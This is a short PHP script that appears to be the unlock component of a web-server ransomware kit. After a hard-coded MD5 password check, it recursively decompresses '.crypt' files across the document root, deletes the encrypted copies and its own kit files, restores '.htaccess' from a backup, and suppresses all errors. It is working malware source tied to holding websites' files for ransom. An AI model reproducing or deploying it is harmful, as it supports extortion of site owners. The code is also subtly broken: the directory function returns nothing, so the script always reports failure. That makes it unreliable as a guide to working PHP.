<?php
ini_set('memory_limit', -1);
error_reporting(0);
	function decfile($filename){
		if (strpos($filename, '.crypt') === FALSE) {
			return;
		}
		$decrypted = gzinflate(file_get_contents($filename));
		file_put_contents(str_replace('.crypt', '', $filename), $decrypted);
		unlink('crypt.php');
		unlink('.htaccess');
		unlink($filename);
		echo "$filename Decrypted.<br>";
	}
	function decdir($dir){
		$files = array_diff(scandir($dir), array('.', '..'));
			foreach($files as $file) {
				if(is_dir($dir."/".$file)){
					decdir($dir."/".$file);
				}else {
					decfile($dir."/".$file);
			}
		}
	}
	if(isset($_POST['pass'])) {
		$input = $_POST['pass'];
		$pass = "d1015c87d1fcb64552c089023e89a7f8";
		if(md5($input) == $pass) {		
			$dec = decdir($_SERVER['DOCUMENT_ROOT']);
			if ($dec) {
				echo "<br>Webroot Decrypted<br>";
				unlink($_SERVER['PHP_SELF']);
				unlink('.htaccess');
				copy('htabackup','.htaccess');
				echo 'Success Decrypted.';
			}else{
				echo 'Failed Decrypted.';
			}
		} else {
			echo 'Failed Password';
		}
		exit();
	}
?>